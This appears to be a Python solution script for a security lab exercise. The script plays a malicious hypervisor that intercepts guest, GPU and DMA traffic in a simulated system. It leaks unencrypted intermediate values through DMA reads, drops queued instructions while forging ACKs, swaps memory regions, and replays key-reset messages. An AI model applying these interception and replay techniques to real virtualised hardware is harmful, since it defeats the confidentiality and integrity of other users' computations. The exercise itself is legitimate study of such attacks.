import socket
import threading
import helper
from donotmodify import *

clients = []
ack_count = 0

input_targets = []
op_targets = []

inputs = []

#task flags
task1 = False
task2_1 = False
task2_2 = False
task2_3 = True

last_ack = b''
first_execution = True
drop_instr_1 = { b'QUEUE:SUB:S2:S1:D3',
                 b'QUEUE:ABS:AB2:S2',
                 b'QUEUE:ADD:A1:D3:D4',
                 b'QUEUE:ABS:AB3:A1',
                 b'QUEUE:ADD:A2:AB2:A1' 
               }

drop_instr_2 = {b'QUEUE:SUB:S1:A1:D3'}

saved_instr = None 
keys_reset = None
        

def handle_client(connection, client_address, dma_socket):
    try:
        # print("Connected to", client_address)
        clients.append(connection)

        intrusion = 0

        while True:
            data = connection.recv(1024)
            if data:

                if task1: 
                    #store the input targets in dram
                    if b'QUEUE:DATA' in data:
                        d = data[helper.SIGLEN + 11:]
                        input_targets.append(d)
                    #store the operation targets in dram
                    if b'ACK:Node Op' in data:
                        d = data.split(b':')[2]  
                        op_targets.append(d.split(b':')[0])

                    #If execution of the node graph is done, 
                    # the single steps are still saved in the dram but not encrypted
                    # we ask the dma to fetch the data from the dram and send it to us 
                    if b'DMA:OUT' in data:
                        out_reg = data[helper.SIGLEN + 8:]     
                        #first input 
                        new_msg = data
                        new_msg = new_msg.replace(out_reg, op_targets[0])
                        dma_socket.sendall(new_msg)
                        msg = dma_socket.recv(1024)
                        ab1 = float(msg.split(b':')[1])
                        inputs.append(-ab1)

                        #second input
                        new_msg = data 
                        new_msg = new_msg.replace(out_reg, op_targets[2])
                        dma_socket.sendall(new_msg)
                        msg = dma_socket.recv(1024)
                        s1 = float(msg.split(b':')[1])
                        inputs.append(ab1 - s1)

                        #third input
                        new_msg = data
                        new_msg = new_msg.replace(out_reg, op_targets[3])
                        dma_socket.sendall(new_msg)
                        msg = dma_socket.recv(1024)
                        s2 = float(msg.split(b':')[1])
                        inputs.append(s1 - s2)

                        #fourth input
                        new_msg = data
                        new_msg = new_msg.replace(out_reg, op_targets[5])
                        dma_socket.sendall(new_msg)
                        msg = dma_socket.recv(1024)
                        a1 = float(msg.split(b':')[1])
                        inputs.append(a1 - inputs[2])

                        #output
                        ab2 = abs(s2)
                        res = ab2 + a1
                        inputs.append(res)
                        print(inputs)
                if task2_1:

                    if b'ACK' in data:
                        #print(data)
                        global last_ack
                        last_ack = data
                       
                    if b'QUEUE:ADD:A2:AB2:A1' in data:
                        #drop the message
                        #return an ACK to the guest
                        #print(last_ack)
                        #change the last number of ack to 2 
                        #last_ack = last_ack[:-1]'
                        connection.sendall(last_ack) 
                        continue

                    if b'QUEUE:SUB:S1:A1:D3' in data:
                        connection.sendall(last_ack)
                        continue 
                if task2_2:
                    if b'EXEC-COMPUTE' in data:
                        global first_execution
                        first_execution = False

                    if b'QUEUE-START' in data:
                        start_queue = True

                    if b'ACK' in data:
                        #print(data)
                        #global last_ack
                        last_ack = data
                        #print(last_ack)

                    if 'QUEUE:': 
                        #drop instructions when needed
                        if first_execution:
                            if data[helper.SIGLEN:] in drop_instr_1:
                                connection.sendall(last_ack)
                                continue
                        else:
                            if data[helper.SIGLEN:] in drop_instr_2:
                                connection.sendall(last_ack)
                                continue 

                    if first_execution:
                        if b'DMA:IN:M2' in data: 
                            data = data.replace(b'M2', b'M4')
        
                        elif b'DMA:IN:M4' in data:
                            data = data.replace(b'M4', b'M2')    
                    else:
                        if b'DMA:IN:M1' in data: 
                            data = data.replace(b'M1', b'M3')           
                        elif b'DMA:IN:M3' in data: 
                            data = data.replace(b'M3', b'M1')   
                if task2_3:

                    if b'EXEC-COMPUTE' in data:  
                        first_execution = False

                    if b'ACK' in data:
                        last_ack = data

                    if first_execution and b'KEYS-RESET' in data:
                        global keys_reset
                        keys_reset = data

                    if first_execution and b'DMA:IN:M1' in data:
                        global saved_instr
                        saved_instr = data

                    if not first_execution: 
                        #drop the reset 
                        if b'RESET' in data and b'KEYS' in data:
                            connection.sendall(keys_reset)
                            continue

                        if b'DMA:IN:M1' in data:
                            data = saved_instr

                        if data[helper.SIGLEN:] in drop_instr_2:
                            connection.sendall(last_ack)
                            continue
                   
                # If the incoming request is a DMA command, the hypervisor
                # sends it to the dma controller
                if b'DMA:IN' in data or b'DMA:OUT' in data:
                    dma_socket.sendall(data)
                    msg = dma_socket.recv(1024)
                    connection.sendall(b'\x00'*helper.SIGLEN+msg)
                else:
                    relay_message(connection, data)
            else:
                break
    finally:
        # print("Connection closed with", client_address)
        connection.close()

def relay_message(sender, message): # Relays the message to the guest or to the gpu
    for client in clients:
        if client != sender:  
            try:
                client.sendall(message)
            except Exception:
                client.close()
                clients.remove(client)

def start_hypervisor():
    dma_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    dma_address = ('localhost', DMASOCKET)
    helper.connect(dma_socket,dma_address)

    hypervisor_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    hypervisor_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    hypervisor_address = ('localhost', SOCKET)
    hypervisor_socket.bind(hypervisor_address)
    hypervisor_socket.listen(2)
    # print("Hypervisor is listening on", hypervisor_address)

    while True:
        connection, client_address = hypervisor_socket.accept()
        client_thread = threading.Thread(target=handle_client, args=(connection, client_address, dma_socket))
        client_thread.start()

if __name__ == "__main__":
    start_hypervisor()



